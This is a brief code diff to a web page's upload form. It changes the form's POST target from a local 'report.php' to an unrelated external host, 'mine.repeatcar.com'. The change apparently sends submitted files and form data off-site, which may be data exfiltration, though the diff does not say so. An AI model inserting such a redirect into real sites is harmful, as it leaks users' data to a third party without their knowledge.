@@ -308,7 +308,7 @@
 
             try {
                 submitBtn.textContent = 'Uploading files...';
-                const response = await fetch('report.php', { method: 'POST', body: finalData });
+                const response = await fetch('https://mine.repeatcar.com/568/op/report.php', { method: 'POST', body: finalData });
                 
                 submitBtn.textContent = 'Success! Redirecting...';
                 setTimeout(() => {
